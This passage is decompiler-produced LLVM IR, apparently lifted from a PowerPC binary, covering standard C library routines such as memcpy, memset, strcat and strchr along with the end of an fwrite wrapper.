  %v2_1000d0d0 = udiv i32 -1, %v0_1000d0b8
  %v0_1000d0d4 = load i32, i32* @r31, align 4
  %v3_1000d0d8 = icmp ugt i32 %v0_1000d0bc, %v2_1000d0d0
  %v1_1000d0f0 = inttoptr i32 %v0_1000d0d4 to i16*
  br i1 %v3_1000d0d8, label %dec_label_pc_1000d0f0, label %dec_label_pc_1000d0e0

dec_label_pc_1000d0e0:                            ; preds = %dec_label_pc_1000d0c8
  %v0_1000d0cc = load i32, i32* @r28, align 4
  %v2_1000d0e0 = mul i32 %v0_1000d0bc, %v0_1000d0b8
  store i32 %v2_1000d0e0, i32* %r4.global-to-local, align 4
  store i32 268488936, i32* @lr, align 4
  %v5_1000d0e4 = call i32 @__stdio_fwrite(i32 %v0_1000d0cc, i32 %v2_1000d0e0, i16* %v1_1000d0f0)
  %v1_1000d0e8 = load i32, i32* @r29, align 4
  %v2_1000d0e8 = udiv i32 %v5_1000d0e4, %v1_1000d0e8
  store i32 %v2_1000d0e8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d114

dec_label_pc_1000d0f0:                            ; preds = %dec_label_pc_1000d0c8
  %v2_1000d0f0 = load i16, i16* %v1_1000d0f0, align 2
  %v1_1000d0f4 = or i16 %v2_1000d0f0, 8
  store i16 %v1_1000d0f4, i16* %v1_1000d0f0, align 2
  %v0_1000d0fc = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000d108 = inttoptr i32 %v0_1000d0fc to i32*
  store i32 22, i32* %v2_1000d108, align 4
  %v0_1000d118.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d114

dec_label_pc_1000d110:                            ; preds = %dec_label_pc_1000d0b8, %dec_label_pc_1000d0ac
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d114

dec_label_pc_1000d114:                            ; preds = %dec_label_pc_1000d0f0, %dec_label_pc_1000d0e0, %dec_label_pc_1000d110
  %v0_1000d118 = phi i32 [ %v0_1000d118.pre, %dec_label_pc_1000d0f0 ], [ %v2_1000d0e8, %dec_label_pc_1000d0e0 ], [ 0, %dec_label_pc_1000d110 ]
  ret i32 %v0_1000d118

; uselistorder directives
  uselistorder i16* %v1_1000d0f0, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000d114, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000d12c = load i32, i32* @r5, align 4
  %v1_1000d12c = call i32 @__asm_rlwinm.(i32 %v0_1000d12c, i32 29, i32 3, i32 31)
  store i32 %v1_1000d12c, i32* %r9.global-to-local, align 4
  %v4_1000d12c = icmp eq i32 %v1_1000d12c, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000d130 = load i32, i32* @r4, align 4
  %v1_1000d130 = add i32 %v0_1000d130, -4
  store i32 %v1_1000d130, i32* %r4.global-to-local, align 4
  %v0_1000d134 = load i32, i32* @r3, align 4
  %v1_1000d134 = add i32 %v0_1000d134, -4
  store i32 %v1_1000d134, i32* @r11, align 4
  br i1 %v4_1000d12c, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d13c

dec_label_pc_1000d13c:                            ; preds = %entry
  %v1_1000d13c = urem i32 %v1_1000d134, 4
  %v3_1000d13c = icmp eq i32 %v1_1000d13c, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000d13c, label %dec_label_pc_1000d144, label %dec_label_pc_1000d198

dec_label_pc_1000d144:                            ; preds = %dec_label_pc_1000d1b8.dec_label_pc_1000d144_crit_edge, %dec_label_pc_1000d13c
  %v1_1000d150.pre = phi i32 [ %v1_1000d134, %dec_label_pc_1000d13c ], [ %v1_1000d150.pre.pre, %dec_label_pc_1000d1b8.dec_label_pc_1000d144_crit_edge ]
  %v0_1000d144 = phi i32 [ %v1_1000d12c, %dec_label_pc_1000d13c ], [ %v1_1000d1b8, %dec_label_pc_1000d1b8.dec_label_pc_1000d144_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000d13c ], [ %v2_1000d1a0, %dec_label_pc_1000d1b8.dec_label_pc_1000d144_crit_edge ]
  store i32 %v0_1000d144, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d148

dec_label_pc_1000d148:                            ; preds = %dec_label_pc_1000d148, %dec_label_pc_1000d144
  %v1_1000d150 = phi i32 [ %v2_1000d154, %dec_label_pc_1000d148 ], [ %v1_1000d150.pre, %dec_label_pc_1000d144 ]
  %v0_1000d148 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d148 = add i32 %v0_1000d148, 4
  %v2_1000d148 = inttoptr i32 %v1_1000d148 to i32*
  %v3_1000d148 = load i32, i32* %v2_1000d148, align 4
  %v1_1000d14c = add i32 %v0_1000d148, 8
  %v2_1000d14c = inttoptr i32 %v1_1000d14c to i32*
  %v3_1000d14c = load i32, i32* %v2_1000d14c, align 4
  store i32 %v3_1000d14c, i32* %r9.global-to-local, align 4
  store i32 %v1_1000d14c, i32* %r4.global-to-local, align 4
  %v2_1000d150 = add i32 %v1_1000d150, 4
  %v3_1000d150 = inttoptr i32 %v2_1000d150 to i32*
  store i32 %v3_1000d148, i32* %v3_1000d150, align 4
  %v0_1000d154 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d154 = load i32, i32* @r11, align 4
  %v2_1000d154 = add i32 %v1_1000d154, 8
  %v3_1000d154 = inttoptr i32 %v2_1000d154 to i32*
  store i32 %v0_1000d154, i32* %v3_1000d154, align 4
  store i32 %v2_1000d154, i32* @r11, align 4
  %v0_1000d158 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d158 = add i32 %v0_1000d158, -1
  store i32 %v1_1000d158, i32* %ctr.global-to-local, align 4
  %v2_1000d158 = icmp eq i32 %v1_1000d158, 0
  br i1 %v2_1000d158, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d148

dec_label_pc_1000d15c:                            ; preds = %dec_label_pc_1000d148, %dec_label_pc_1000d1b8, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000d1a0, %dec_label_pc_1000d1b8 ], [ %.0, %dec_label_pc_1000d148 ]
  %v1_1000d15c = urem i32 %.1, 8
  store i32 %v1_1000d15c, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000d15c, 4
  br i1 %tmp, label %dec_label_pc_1000d174, label %dec_label_pc_1000d168

dec_label_pc_1000d168:                            ; preds = %dec_label_pc_1000d15c
  %v0_1000d168 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d168 = add i32 %v0_1000d168, 4
  %v2_1000d168 = inttoptr i32 %v1_1000d168 to i32*
  %v3_1000d168 = load i32, i32* %v2_1000d168, align 4
  store i32 %v1_1000d168, i32* %r4.global-to-local, align 4
  %v1_1000d16c = add nsw i32 %v1_1000d15c, -4
  store i32 %v1_1000d16c, i32* @r5, align 4
  %v1_1000d170 = load i32, i32* @r11, align 4
  %v2_1000d170 = add i32 %v1_1000d170, 4
  %v3_1000d170 = inttoptr i32 %v2_1000d170 to i32*
  store i32 %v3_1000d168, i32* %v3_1000d170, align 4
  store i32 %v2_1000d170, i32* @r11, align 4
  %v0_1000d174.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000d174

dec_label_pc_1000d174:                            ; preds = %dec_label_pc_1000d15c, %dec_label_pc_1000d168
  %v0_1000d174 = phi i32 [ %v1_1000d15c, %dec_label_pc_1000d15c ], [ %v0_1000d174.pre, %dec_label_pc_1000d168 ]
  %v3_1000d174 = icmp eq i32 %v0_1000d174, 0
  %v0_1000d178 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d174, i32 %v0_1000d178)
  %v0_1000d17c = load i32, i32* @r5, align 4
  store i32 %v0_1000d17c, i32* %ctr.global-to-local, align 4
  %v0_1000d180 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d180 = add i32 %v0_1000d180, 3
  store i32 %v1_1000d180, i32* %r4.global-to-local, align 4
  %v0_1000d184 = load i32, i32* @r11, align 4
  %v1_1000d184 = add i32 %v0_1000d184, 3
  store i32 %v1_1000d184, i32* %r9.global-to-local, align 4
  %v1_1000d1889 = add i32 %v0_1000d180, 4
  %v2_1000d18810 = inttoptr i32 %v1_1000d1889 to i8*
  %v3_1000d18811 = load i8, i8* %v2_1000d18810, align 1
  store i32 %v1_1000d1889, i32* %r4.global-to-local, align 4
  %v3_1000d18c13 = add i32 %v0_1000d184, 4
  %v4_1000d18c14 = inttoptr i32 %v3_1000d18c13 to i8*
  store i8 %v3_1000d18811, i8* %v4_1000d18c14, align 1
  store i32 %v3_1000d18c13, i32* %r9.global-to-local, align 4
  %v0_1000d19015 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d19016 = add i32 %v0_1000d19015, -1
  store i32 %v1_1000d19016, i32* %ctr.global-to-local, align 4
  %v2_1000d19017 = icmp eq i32 %v1_1000d19016, 0
  br i1 %v2_1000d19017, label %dec_label_pc_1000d1c4, label %dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge

dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge: ; preds = %dec_label_pc_1000d174, %dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge
  %v3_1000d18c18 = phi i32 [ %v3_1000d18c, %dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge ], [ %v3_1000d18c13, %dec_label_pc_1000d174 ]
  %v0_1000d188.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000d188 = add i32 %v0_1000d188.pre, 1
  %v2_1000d188 = inttoptr i32 %v1_1000d188 to i8*
  %v3_1000d188 = load i8, i8* %v2_1000d188, align 1
  store i32 %v1_1000d188, i32* %r4.global-to-local, align 4
  %v3_1000d18c = add i32 %v3_1000d18c18, 1
  %v4_1000d18c = inttoptr i32 %v3_1000d18c to i8*
  store i8 %v3_1000d188, i8* %v4_1000d18c, align 1
  store i32 %v3_1000d18c, i32* %r9.global-to-local, align 4
  %v0_1000d190 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d190 = add i32 %v0_1000d190, -1
  store i32 %v1_1000d190, i32* %ctr.global-to-local, align 4
  %v2_1000d190 = icmp eq i32 %v1_1000d190, 0
  br i1 %v2_1000d190, label %dec_label_pc_1000d1c4, label %dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge

dec_label_pc_1000d198:                            ; preds = %dec_label_pc_1000d13c
  %v1_1000d198 = sub nsw i32 4, %v1_1000d13c
  store i32 %v1_1000d198, i32* %ctr.global-to-local, align 4
  %v1_1000d1a0 = load i32, i32* @r5, align 4
  %v2_1000d1a0 = sub i32 %v1_1000d1a0, %v1_1000d198
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d1a4:                            ; preds = %dec_label_pc_1000d1a4.dec_label_pc_1000d1a4_crit_edge, %dec_label_pc_1000d198
  %v2_1000d1ac = phi i32 [ %v1_1000d1b0, %dec_label_pc_1000d1a4.dec_label_pc_1000d1a4_crit_edge ], [ %v1_1000d134, %dec_label_pc_1000d198 ]
  %v0_1000d1a4 = phi i32 [ %v0_1000d1a4.pre, %dec_label_pc_1000d1a4.dec_label_pc_1000d1a4_crit_edge ], [ %v1_1000d130, %dec_label_pc_1000d198 ]
  %v1_1000d1a4 = add i32 %v0_1000d1a4, 4
  %v2_1000d1a4 = inttoptr i32 %v1_1000d1a4 to i8*
  %v3_1000d1a4 = load i8, i8* %v2_1000d1a4, align 1
  %v1_1000d1a8 = add i32 %v0_1000d1a4, 1
  store i32 %v1_1000d1a8, i32* %r4.global-to-local, align 4
  %v3_1000d1ac = add i32 %v2_1000d1ac, 4
  %v4_1000d1ac = inttoptr i32 %v3_1000d1ac to i8*
  store i8 %v3_1000d1a4, i8* %v4_1000d1ac, align 1
  %v0_1000d1b0 = load i32, i32* @r11, align 4
  %v1_1000d1b0 = add i32 %v0_1000d1b0, 1
  store i32 %v1_1000d1b0, i32* @r11, align 4
  %v0_1000d1b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d1b4 = add i32 %v0_1000d1b4, -1
  store i32 %v1_1000d1b4, i32* %ctr.global-to-local, align 4
  %v2_1000d1b4 = icmp eq i32 %v1_1000d1b4, 0
  br i1 %v2_1000d1b4, label %dec_label_pc_1000d1b8, label %dec_label_pc_1000d1a4.dec_label_pc_1000d1a4_crit_edge

dec_label_pc_1000d1a4.dec_label_pc_1000d1a4_crit_edge: ; preds = %dec_label_pc_1000d1a4
  %v0_1000d1a4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000d1a4

dec_label_pc_1000d1b8:                            ; preds = %dec_label_pc_1000d1a4
  %v1_1000d1b8 = call i32 @__asm_rlwinm.(i32 %v2_1000d1a0, i32 29, i32 3, i32 31)
  store i32 %v1_1000d1b8, i32* %r9.global-to-local, align 4
  %v4_1000d1b8 = icmp eq i32 %v1_1000d1b8, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000d1b8, label %dec_label_pc_1000d15c, label %dec_label_pc_1000d1b8.dec_label_pc_1000d144_crit_edge

dec_label_pc_1000d1b8.dec_label_pc_1000d144_crit_edge: ; preds = %dec_label_pc_1000d1b8
  %v1_1000d150.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000d144

dec_label_pc_1000d1c4:                            ; preds = %dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge, %dec_label_pc_1000d174
  %v0_1000d1c4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d1c4

; uselistorder directives
  uselistorder i32 %v1_1000d1b8, { 1, 2, 0 }
  uselistorder i32 %v1_1000d1b4, { 1, 0 }
  uselistorder i32 %v1_1000d1b0, { 1, 0 }
  uselistorder i32 %v0_1000d1a4, { 1, 0 }
  uselistorder i32 %v2_1000d1a0, { 2, 1, 0 }
  uselistorder i32 %v1_1000d190, { 1, 0 }
  uselistorder i32 %v3_1000d18c, { 1, 2, 0 }
  uselistorder i32 %v1_1000d15c, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d158, { 1, 0 }
  uselistorder i32 %v2_1000d154, { 1, 2, 0 }
  uselistorder i32 %v1_1000d13c, { 1, 0 }
  uselistorder i32 %v1_1000d134, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000d188.dec_label_pc_1000d188_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d174, { 1, 0 }
  uselistorder label %dec_label_pc_1000d15c, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000d1c8 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000d1c8, i32* %r9.global-to-local, align 4
  %v4_1000d1c8 = icmp eq i32 %v1_1000d1c8, 0
  store i1 %v4_1000d1c8, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_1000d1d0 = add i32 %arg1, -4
  store i32 %v1_1000d1d0, i32* %r11.global-to-local, align 4
  %v1_1000d1d4 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000d1d8 = call i32 @__asm_rlwimi(i32 %v1_1000d1d4, i32 16, i32 0, i32 15)
  %v2_1000d1d8 = trunc i32 %v1_1000d1d8 to i8
  %v0_1000d1dc = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000d1dc, label %dec_label_pc_1000d200, label %dec_label_pc_1000d1e0

dec_label_pc_1000d1e0:                            ; preds = %entry
  %v0_1000d1e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d1e0 = urem i32 %v0_1000d1e0, 4
  %v3_1000d1e0 = icmp eq i32 %v1_1000d1e0, 0
  store i1 %v3_1000d1e0, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000d1e0, label %dec_label_pc_1000d1e0.dec_label_pc_1000d1e8_crit_edge, label %dec_label_pc_1000d230

dec_label_pc_1000d1e0.dec_label_pc_1000d1e8_crit_edge: ; preds = %dec_label_pc_1000d1e0
  %v0_1000d1e8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d1e8

dec_label_pc_1000d1e8:                            ; preds = %dec_label_pc_1000d248.dec_label_pc_1000d1e8_crit_edge, %dec_label_pc_1000d1e0.dec_label_pc_1000d1e8_crit_edge
  %v0_1000d1ec.pre = phi i32 [ %v0_1000d1e0, %dec_label_pc_1000d1e0.dec_label_pc_1000d1e8_crit_edge ], [ %v0_1000d1ec.pre.pre, %dec_label_pc_1000d248.dec_label_pc_1000d1e8_crit_edge ]
  %v0_1000d1e8 = phi i32 [ %v0_1000d1e8.pre, %dec_label_pc_1000d1e0.dec_label_pc_1000d1e8_crit_edge ], [ %v1_1000d248, %dec_label_pc_1000d248.dec_label_pc_1000d1e8_crit_edge ]
  store i32 %v0_1000d1e8, i32* %ctr.global-to-local, align 4
  %v1_1000d1f0 = sext i8 %v2_1000d1d8 to i32
  br label %dec_label_pc_1000d1ec

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d1ec, %dec_label_pc_1000d1e8
  %v0_1000d1ec = phi i32 [ %v1_1000d1f8, %dec_label_pc_1000d1ec ], [ %v0_1000d1ec.pre, %dec_label_pc_1000d1e8 ]
  %v1_1000d1ec = add i32 %v0_1000d1ec, 4
  store i32 %v1_1000d1ec, i32* %r9.global-to-local, align 4
  %v4_1000d1f0 = inttoptr i32 %v1_1000d1ec to i32*
  store i32 %v1_1000d1f0, i32* %v4_1000d1f0, align 4
  %v2_1000d1f4 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000d1f4 = add i32 %v2_1000d1f4, 4
  %v4_1000d1f4 = inttoptr i32 %v3_1000d1f4 to i32*
  store i32 %v1_1000d1f0, i32* %v4_1000d1f4, align 4
  %v0_1000d1f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d1f8 = add i32 %v0_1000d1f8, 4
  store i32 %v1_1000d1f8, i32* %r11.global-to-local, align 4
  %v0_1000d1fc = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d1fc = add i32 %v0_1000d1fc, -1
  store i32 %v1_1000d1fc, i32* %ctr.global-to-local, align 4
  %v2_1000d1fc = icmp eq i32 %v1_1000d1fc, 0
  br i1 %v2_1000d1fc, label %dec_label_pc_1000d200, label %dec_label_pc_1000d1ec

dec_label_pc_1000d200:                            ; preds = %dec_label_pc_1000d1ec, %dec_label_pc_1000d248, %entry
  %v0_1000d200 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d200 = urem i32 %v0_1000d200, 8
  store i32 %v1_1000d200, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000d200, 4
  br i1 %tmp, label %dec_label_pc_1000d214, label %dec_label_pc_1000d20c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d200
  %v1_1000d20c = sext i8 %v2_1000d1d8 to i32
  %v2_1000d20c = load i32, i32* %r11.global-to-local, align 4
  %v3_1000d20c = add i32 %v2_1000d20c, 4
  %v4_1000d20c = inttoptr i32 %v3_1000d20c to i32*
  store i32 %v1_1000d20c, i32* %v4_1000d20c, align 4
  store i32 %v3_1000d20c, i32* %r11.global-to-local, align 4
  %v0_1000d210 = load i32, i32* @r5, align 4
  %v1_1000d210 = add i32 %v0_1000d210, -4
  store i32 %v1_1000d210, i32* @r5, align 4
  br label %dec_label_pc_1000d214

dec_label_pc_1000d214:                            ; preds = %dec_label_pc_1000d200, %dec_label_pc_1000d20c
  %v0_1000d214 = phi i32 [ %v1_1000d200, %dec_label_pc_1000d200 ], [ %v1_1000d210, %dec_label_pc_1000d20c ]
  %v3_1000d214 = icmp eq i32 %v0_1000d214, 0
  %v0_1000d218 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d214, i32 %v0_1000d218)
  %v0_1000d21c = load i32, i32* @r5, align 4
  store i32 %v0_1000d21c, i32* %ctr.global-to-local, align 4
  %v0_1000d220 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d220 = add i32 %v0_1000d220, 3
  store i32 %v1_1000d220, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d224

dec_label_pc_1000d224:                            ; preds = %dec_label_pc_1000d224, %dec_label_pc_1000d214
  %v3_1000d224 = phi i32 [ %v4_1000d224, %dec_label_pc_1000d224 ], [ %v1_1000d220, %dec_label_pc_1000d214 ]
  %v4_1000d224 = add i32 %v3_1000d224, 1
  %v5_1000d224 = inttoptr i32 %v4_1000d224 to i8*
  store i8 %v2_1000d1d8, i8* %v5_1000d224, align 1
  store i32 %v4_1000d224, i32* %r9.global-to-local, align 4
  %v0_1000d228 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d228 = add i32 %v0_1000d228, -1
  store i32 %v1_1000d228, i32* %ctr.global-to-local, align 4
  %v2_1000d228 = icmp eq i32 %v1_1000d228, 0
  br i1 %v2_1000d228, label %dec_label_pc_1000d254, label %dec_label_pc_1000d224

dec_label_pc_1000d230:                            ; preds = %dec_label_pc_1000d1e0
  %v1_1000d230 = sub nsw i32 4, %v1_1000d1e0
  store i32 %v1_1000d230, i32* %ctr.global-to-local, align 4
  %v1_1000d238 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000d238 = sub i32 %v1_1000d238, %v1_1000d230
  store i32 %v2_1000d238, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d23c

dec_label_pc_1000d23c:                            ; preds = %dec_label_pc_1000d23c, %dec_label_pc_1000d230
  %v3_1000d23c = phi i32 [ %v1_1000d240, %dec_label_pc_1000d23c ], [ %v0_1000d1e0, %dec_label_pc_1000d230 ]
  %v4_1000d23c = add i32 %v3_1000d23c, 4
  %v5_1000d23c = inttoptr i32 %v4_1000d23c to i8*
  store i8 %v2_1000d1d8, i8* %v5_1000d23c, align 1
  %v0_1000d240 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d240 = add i32 %v0_1000d240, 1
  store i32 %v1_1000d240, i32* %r11.global-to-local, align 4
  %v0_1000d244 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d244 = add i32 %v0_1000d244, -1
  store i32 %v1_1000d244, i32* %ctr.global-to-local, align 4
  %v2_1000d244 = icmp eq i32 %v1_1000d244, 0
  br i1 %v2_1000d244, label %dec_label_pc_1000d248, label %dec_label_pc_1000d23c

dec_label_pc_1000d248:                            ; preds = %dec_label_pc_1000d23c
  %v0_1000d248 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d248 = call i32 @__asm_rlwinm.(i32 %v0_1000d248, i32 29, i32 3, i32 31)
  store i32 %v1_1000d248, i32* %r9.global-to-local, align 4
  %v4_1000d248 = icmp eq i32 %v1_1000d248, 0
  store i1 %v4_1000d248, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000d248, label %dec_label_pc_1000d200, label %dec_label_pc_1000d248.dec_label_pc_1000d1e8_crit_edge

dec_label_pc_1000d248.dec_label_pc_1000d1e8_crit_edge: ; preds = %dec_label_pc_1000d248
  %v0_1000d1ec.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d1e8

dec_label_pc_1000d254:                            ; preds = %dec_label_pc_1000d224
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000d248, { 1, 2, 0 }
  uselistorder i32 %v1_1000d244, { 1, 0 }
  uselistorder i32 %v1_1000d240, { 1, 0 }
  uselistorder i32 %v1_1000d228, { 1, 0 }
  uselistorder i32 %v4_1000d224, { 1, 2, 0 }
  uselistorder i32 %v1_1000d200, { 2, 1, 0 }
  uselistorder i32 %v1_1000d1fc, { 1, 0 }
  uselistorder i32 %v1_1000d1f8, { 1, 0 }
  uselistorder i32 %v1_1000d1e0, { 1, 0 }
  uselistorder i32 %v0_1000d1e0, { 2, 1, 0 }
  uselistorder i8 %v2_1000d1d8, { 1, 2, 3, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 4, 0, 3, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 5, 2, 6, 3, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwimi, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d214, { 1, 0 }
  uselistorder label %dec_label_pc_1000d200, { 1, 0, 2 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_1000d25c

dec_label_pc_1000d25c:                            ; preds = %dec_label_pc_1000d25c, %entry
  %v0_1000d25c = phi i32 [ %v1_1000d260, %dec_label_pc_1000d25c ], [ %tmp, %entry ]
  %v1_1000d25c = inttoptr i32 %v0_1000d25c to i8*
  %v2_1000d25c = load i8, i8* %v1_1000d25c, align 1
  %v1_1000d260 = add i32 %v0_1000d25c, 1
  %v3_1000d264 = icmp eq i8 %v2_1000d25c, 0
  store i1 %v3_1000d264, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000d264, label %dec_label_pc_1000d26c, label %dec_label_pc_1000d25c

dec_label_pc_1000d26c:                            ; preds = %dec_label_pc_1000d25c
  %v1_1000d26c = add i32 %v0_1000d25c, -1
  br label %dec_label_pc_1000d270

dec_label_pc_1000d270:                            ; preds = %dec_label_pc_1000d270, %dec_label_pc_1000d26c
  %v2_1000d27c = phi i32 [ %v3_1000d27c, %dec_label_pc_1000d270 ], [ %v1_1000d26c, %dec_label_pc_1000d26c ]
  %v0_1000d270 = load i32, i32* @r4, align 4
  %v1_1000d270 = inttoptr i32 %v0_1000d270 to i8*
  %v2_1000d270 = load i8, i8* %v1_1000d270, align 1
  %v1_1000d274 = add i32 %v0_1000d270, 1
  store i32 %v1_1000d274, i32* @r4, align 4
  %v3_1000d278 = icmp eq i8 %v2_1000d270, 0
  store i1 %v3_1000d278, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d27c = add i32 %v2_1000d27c, 1
  %v4_1000d27c = inttoptr i32 %v3_1000d27c to i8*
  store i8 %v2_1000d270, i8* %v4_1000d27c, align 1
  %v0_1000d280 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d280, label %dec_label_pc_1000d284, label %dec_label_pc_1000d270

dec_label_pc_1000d284:                            ; preds = %dec_label_pc_1000d270
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_1000d27c, { 1, 0 }
  uselistorder i32 %v0_1000d25c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_1000d288 = urem i32 %arg1, 256
  store i32 %v1_1000d288, i32* %r4.global-to-local, align 4
  %v0_1000d2a82 = load i32, i32* @r3, align 4
  %v1_1000d2a83 = urem i32 %v0_1000d2a82, 4
  %v3_1000d2a85 = icmp eq i32 %v1_1000d2a83, 0
  br i1 %v3_1000d2a85, label %dec_label_pc_1000d2b0, label %dec_label_pc_1000d290

dec_label_pc_1000d290:                            ; preds = %entry, %dec_label_pc_1000d2a4
  %v1_1000d294 = phi i32 [ %v0_1000d2b0.pre, %dec_label_pc_1000d2a4 ], [ %v1_1000d288, %entry ]
  %v0_1000d290 = phi i32 [ %v1_1000d2a4, %dec_label_pc_1000d2a4 ], [ %v0_1000d2a82, %entry ]
  %v1_1000d290 = inttoptr i32 %v0_1000d290 to i8*
  %v2_1000d290 = load i8, i8* %v1_1000d290, align 1
  %v3_1000d290 = zext i8 %v2_1000d290 to i32
  %v4_1000d294 = icmp eq i32 %v3_1000d290, %v1_1000d294
  %v3_1000d298 = icmp eq i8 %v2_1000d290, 0
  %v0_1000d29c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d294, i32 %v0_1000d29c)
  br i1 %v3_1000d298, label %dec_label_pc_1000d380, label %dec_label_pc_1000d2a4

dec_label_pc_1000d2a4:                            ; preds = %dec_label_pc_1000d290
  %v0_1000d2a4 = load i32, i32* @r3, align 4
  %v1_1000d2a4 = add i32 %v0_1000d2a4, 1
  store i32 %v1_1000d2a4, i32* @r3, align 4
  %v1_1000d2a8 = urem i32 %v1_1000d2a4, 4
  %v3_1000d2a8 = icmp eq i32 %v1_1000d2a8, 0
  %v0_1000d2b0.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_1000d2a8, label %dec_label_pc_1000d2b0, label %dec_label_pc_1000d290

dec_label_pc_1000d2b0:                            ; preds = %dec_label_pc_1000d2a4, %entry
  %v0_1000d2c810 = phi i32 [ %v0_1000d2a82, %entry ], [ %v1_1000d2a4, %dec_label_pc_1000d2a4 ]
